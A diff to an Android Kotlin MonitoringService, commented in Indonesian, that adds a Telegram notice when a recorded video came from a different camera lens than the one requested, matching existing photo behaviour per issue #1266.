@@ -12146,6 +12146,23 @@ class MonitoringService : Service() {
                                 when (uploadOutcome ?: MediaSendOutcome.KEPT) {
                                     MediaSendOutcome.SENT -> {
                                         sendToTelegram("🎥 Video terkirim (${seconds} dtk).")
+                                        // Pemberitahuan lensa cadangan
+                                        // seperti jalur foto (issue #1266):
+                                        // video dari lensa lain daripada
+                                        // yang diminta tak lagi senyap.
+                                        try {
+                                            val used = cameraService.lastLensFacing
+                                            val asked = selectedLensFacing()
+                                            if (used != -1 && used != asked) {
+                                                val name = when (used) {
+                                                    android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK -> "belakang"
+                                                    android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT -> "depan"
+                                                    else -> "lain"
+                                                }
+                                                sendToTelegram("🎥 Lensa yang diminta tak ada, dipakai kamera $name.")
+                                            }
+                                        } catch (_: Exception) {
+                                        }
                                         flushPendingVideos()
                                     }
                                     MediaSendOutcome.DROPPED -> {
